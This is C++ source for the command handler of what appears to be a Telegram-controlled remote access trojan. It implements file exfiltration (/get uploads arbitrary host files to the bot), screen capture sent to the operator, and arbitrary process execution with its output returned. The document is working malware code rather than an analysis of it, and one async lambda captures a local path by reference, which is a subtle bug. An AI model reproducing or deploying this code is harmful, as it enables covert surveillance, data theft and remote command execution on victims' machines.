/*rat_handler/src/threaded_handler.cpp*/
#include "rat/Handler.hpp"
#include "rat/handler/debug.hpp"
#include "rat/media.hpp"
#include "rat/system.hpp"

#include <boost/algorithm/string.hpp>
#include <filesystem>
#include <fmt/chrono.h>
#include <fmt/core.h>
#include <tiny-process-library/process.hpp> //tiny-process-library

namespace rat::handler {
constexpr size_t MAX_TELEGRAM_UPLOAD_SIZE = 50 * 1024 * KB;

void Handler::handleGetCommand() {
    if(command.parameters.empty()) {
        this->sendMessage("No file specified");
        return;
    }

    const auto file_path = rat::system::normalizePath(command.parameters[0]);
    if(!std::filesystem::exists(file_path)) {
        this->sendMessage(fmt::format("File does not exist: {}", file_path.string()));
        return;
    }

    const size_t file_size = std::filesystem::file_size(file_path);
    HANDLER_DEBUG_LOG("Uploading {} of size {} bytes", file_path.string(), file_size);

    if(file_size < 2 * 1024 * KB) {
        // small file → sync
        this->sendFile(file_path);
    } else if(file_size < MAX_TELEGRAM_UPLOAD_SIZE) {
        this->long_process_pool->enqueue([this, &file_path] {
            HANDLER_DEBUG_LOG("Async upload {}", file_path.string());
            std::lock_guard<std::mutex> lock(this->backing_bot_mutex);
            const auto &send_message_result = this->backing_bot->sendMessage(
                fmt::format("File: {} will be uploaded", file_path.string()));
            if(send_message_result == ::rat::tbot::BotResponse::SUCCESS) {
                this->backing_bot_net_ops_counter++;
            }
            auto resp = this->backing_bot->sendFile(file_path);
            if(resp != rat::tbot::BotResponse::SUCCESS) {
                HANDLER_ERROR_LOG("Failed to upload {}", file_path.string());
            }
            this->backing_bot->curl_client.reset();
            this->backing_bot_net_ops_counter = 0;
        });
    } else {
        this->sendMessage(fmt::format("File too big for Telegram (max 50 MB "
                                      "or /get method 2MB), this one is {}",
                                      file_size));
    }
}

void Handler::handleScreenshotCommand() {
    auto image_path =
        std::filesystem::path(fmt::format("{}.png", rat::system::getCurrentDateTime_Underscored()));
    this->short_process_pool->enqueue([this, image_path] {
        std::string output_buffer;
        bool success = rat::media::screenshot::takeScreenshot(image_path, output_buffer);

        std::lock_guard<std::mutex> lock(this->backing_bot_mutex);

        if(success && std::filesystem::exists(image_path)) {
            HANDLER_DEBUG_LOG("{} taken", image_path.string());

            if(this->backing_bot->sendPhoto(image_path) != rat::tbot::BotResponse::SUCCESS) {
                HANDLER_ERROR_LOG("Failed uploading {}", image_path.string());
                this->backing_bot->sendMessage("Failed at sending screenshot");
                this->backing_bot_net_ops_counter++;
            }
        }
        if(!output_buffer.empty()) {
            this->sendBackingMessage(output_buffer);
        }
        this->backing_bot->curl_client.reset();
        this->backing_bot_net_ops_counter = 0;
        rat::system::removeFile(image_path);
    });

    this->sendMessage("Screenshot command launched.");
}

void Handler::handleProcessCommand() {
    HANDLER_DEBUG_LOG("Creating the process manager for the command {}",
                      this->telegram_update->message.text);
    // this is unidiomatic in C++ and very dangerous, but since this variable is
    // a refrence to a unique pointer object, and the object is guaranteed to
    // outlive this scope, it is safe in this context;
    auto *p_process_pool = this->long_process_pool.get();
    if(this->command.directive == "/process") {
        p_process_pool = this->short_process_pool.get();
    }
    p_process_pool->enqueue([this]() {
        std::ostringstream stdout_stream;
        std::ostringstream stderr_stream;

        std::mutex stdout_mutex;
        std::mutex stderr_mutex;

        const auto catching_stdout_lambda = [&stdout_stream, &stdout_mutex](const char *bytes,
                                                                            size_t n_bytes) {
            std::lock_guard<std::mutex> lock(stdout_mutex);
            stdout_stream.write(bytes, n_bytes);
        };

        const auto catching_stderr_lambda = [&stderr_stream, &stderr_mutex](const char *bytes,
                                                                            size_t n_bytes) {
            std::lock_guard<std::mutex> lock(stderr_mutex);
            stderr_stream.write(bytes, n_bytes);
        };

        TinyProcessLib::Process process(this->command.parameters,
                                        std::filesystem::current_path().string(),
                                        catching_stdout_lambda,
                                        catching_stderr_lambda);

        const auto &process_id = static_cast<int64_t>(process.get_id());

        this->backing_bot_mutex.lock();

        this->backing_bot->sendMessage(fmt::format("Process launched ID: {}", process_id));
        this->backing_bot_net_ops_counter++;
        const int process_exit_code = process.get_exit_status();

        const std::string final_message = fmt::format("Exit_Code:{}\nSTDOUT:\n{}\nSTDERR:{}\n",
                                                      process_exit_code,
                                                      stdout_stream.str(),
                                                      stderr_stream.str());

        constexpr size_t TELEGRAM_LIMIT = 3000; // 3 KB safe cap
        if(final_message.size() <= TELEGRAM_LIMIT) {
            this->backing_bot->sendMessage(final_message);
            this->backing_bot_net_ops_counter++;
        } else {
            const std::string filename =
                fmt::format("process-{}.txt", ::rat::system::getCurrentDateTime_Underscored());
            std::ofstream outfile(filename, std::ios::trunc);
            outfile << final_message;
            outfile.close();

            this->backing_bot->sendFile(filename, "Process output too large, see attached file.");
            std::filesystem::remove(filename);
            this->backing_bot->curl_client.reset();
            this->backing_bot_net_ops_counter = 0;
        }
        this->backing_bot_mutex.unlock();
    });
    if(this->command.parameters.size() > 4) {
        this->command.parameters.resize(4);
    }
}
} // namespace rat::handler

#undef HANDLER_DEBUG_LOG
#undef HANDLER_ERROR_LOG
#ifdef DEBUG_RAT_HANDLER
#undef DEBUG_RAT_HANDLER
#endif
